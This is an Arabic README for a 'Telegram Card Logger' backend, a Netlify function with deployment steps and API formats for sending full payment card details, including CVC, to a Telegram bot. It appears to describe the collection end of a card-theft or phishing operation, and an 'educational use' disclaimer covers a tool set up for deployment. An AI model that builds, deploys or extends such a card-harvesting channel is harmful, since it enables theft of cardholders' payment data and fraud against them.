# 🔔 Telegram Card Logger - Backend

باك إند آمن للتليجرام مع نظام Rate Limiting متقدم - **10 رسائل لكل جهاز في الدقيقة**

## 🚀 الميزات

### 📊 نظام Rate Limiting متقدم
- **10 رسائل فقط لكل جهاز في الدقيقة**
- حظر مؤقت لمدة 5 دقائق عند تجاوز الحد
- تتبع الطلبات المتبقية والوقت المتبقي
- مراقبة الأنشطة المشبوهة

### 🛡️ حماية متطورة
- تشفير البيانات الحساسة
- التحقق من صحة الطلبات
- مراقبة الأنشطة المشبوهة
- حظر الأجهزة المزعجة

## 📁 هيكل المشروع

```
backend/
├── netlify-functions/
│   └── telegram-api-updated.js    # دالة Netlify الرئيسية
├── netlify.toml                   # إعدادات Netlify
├── .gitignore                     # ملفات مستثناة من Git
└── README_BACKEND.md              # هذا الملف
```

## ⚙️ التثبيت والإعداد

### 1. إنشاء مفتاح التشفير

#### باستخدام Node.js:
```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

#### باستخدام PowerShell:
```powershell
$bytes = New-Object Byte[] 32
(New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
[System.BitConverter]::ToString($bytes) -replace '-', ''
```

### 2. إعداد Netlify

#### أ. رفع المشروع:
```bash
# تثبيت Netlify CLI
npm install -g netlify-cli

# تسجيل الدخول
netlify login

# رفع المشروع
netlify deploy --prod --dir=.
```

#### ب. إعداد متغيرات البيئة:
في لوحة تحكم Netlify:
1. اذهب إلى Site settings > Environment variables
2. أضف متغير جديد:
   - **Key**: `ENCRYPTION_KEY`
   - **Value**: المفتاح الذي أنشأته

### 3. الحصول على رابط API

بعد النشر، ستحصل على رابط مثل:
```
https://your-site.netlify.app/.netlify/functions/telegram-api
```

## 🔧 كيفية الاستخدام

### API Endpoints

#### POST `/telegram-api`
إرسال رسالة إلى تليجرام

**Request Body:**
```json
{
  "data": {
    "type": "card",
    "message": {
      "number": "1234-5678-9012-3456",
      "name": "John Doe",
      "expiry": "12/25"
    }
  },
  "deviceFingerprint": "unique-device-id",
  "sessionKey": "session-key",
  "timestamp": 1640995200000,
  "signature": "calculated-signature"
}
```

**Response:**
```json
{
  "success": true,
  "message": "تم إرسال الرسالة بنجاح",
  "message_id": 123,
  "environment": "Netlify Functions",
  "rateLimit": {
    "remainingRequests": 9,
    "resetTime": 45
  }
}
```

#### GET `/telegram-api`
الحصول على إحصائيات النظام

**Response:**
```json
{
  "success": true,
  "stats": {
    "totalDevices": 5,
    "blockedDevices": 1,
    "rateLimitedDevices": 2,
    "environment": "Netlify Functions",
    "timestamp": "2024-01-01T00:00:00.000Z"
  }
}
```

## 📊 أنواع الرسائل المدعومة

### 1. بيانات البطاقة
```json
{
  "type": "card",
  "message": {
    "number": "1234-5678-9012-3456",
    "name": "John Doe",
    "expiry": "12/25",
    "cvc": "123"
  }
}
```

### 2. بيانات BIN
```json
{
  "type": "bin",
  "message": {
    "pattern": "123456",
    "name": "Visa",
    "cardNumber": "1234567890123456",
    "expiryDate": "12/25",
    "cvc": "123"
  }
}
```

### 3. رسالة عادية
```json
{
  "type": "message",
  "message": "رسالة نصية عادية"
}
```

## 🛡️ الأمان

### تشفير البيانات
- تشفير توكن البوت و Chat ID
- توقيع الطلبات
- فحص صحة البيانات

### Rate Limiting
- 10 رسائل لكل جهاز في الدقيقة
- حظر مؤقت عند التجاوز
- مراقبة الأنشطة المشبوهة

### حماية إضافية
- فحص وقت الطلب
- التحقق من الجلسة
- حظر الأجهاز المزعجة

## 🔍 استكشاف الأخطاء

### مشاكل شائعة:

#### 1. خطأ في إعدادات البوت
```
"error": "خطأ في إعدادات البوت",
"code": "BOT_CONFIG_ERROR"
```
**الحل:** تحقق من صحة ENCRYPTION_KEY

#### 2. تجاوز حد الطلبات
```
"error": "تم تجاوز حد الطلبات (10 رسائل في الدقيقة)",
"code": "RATE_LIMIT_EXCEEDED"
```
**الحل:** انتظر 5 دقائق أو استخدم جهاز آخر

#### 3. طلب منتهي الصلاحية
```
"error": "طلب منتهي الصلاحية"
```
**الحل:** أعد إرسال الطلب

## 📈 المراقبة

### سجلات Netlify
1. اذهب إلى لوحة تحكم Netlify
2. اختر مشروعك
3. اذهب إلى Functions
4. اضغط على الدالة لعرض السجلات

### إحصائيات النظام
استخدم GET endpoint للحصول على إحصائيات النظام:
```bash
curl https://your-site.netlify.app/.netlify/functions/telegram-api
```

## 🔄 التطوير

### التطوير المحلي
```bash
# تثبيت Netlify CLI
npm install -g netlify-cli

# تشغيل محلي
netlify dev
```

### اختبار الدالة
```bash
# اختبار محلي
netlify functions:invoke telegram-api --body '{"data":{"type":"message","message":"test"}}'
```

## 📞 الدعم

للمساعدة أو الإبلاغ عن مشاكل:
1. راجع هذا الملف أولاً
2. تحقق من سجلات Netlify
3. تأكد من صحة متغيرات البيئة

## 📄 الترخيص

هذا المشروع مخصص للاستخدام التعليمي والبحثي فقط.

---

**⚠️ تحذير**: هذا الباك إند مخصص للاستخدام القانوني فقط. يرجى احترام خصوصية الآخرين وقوانين حماية البيانات. 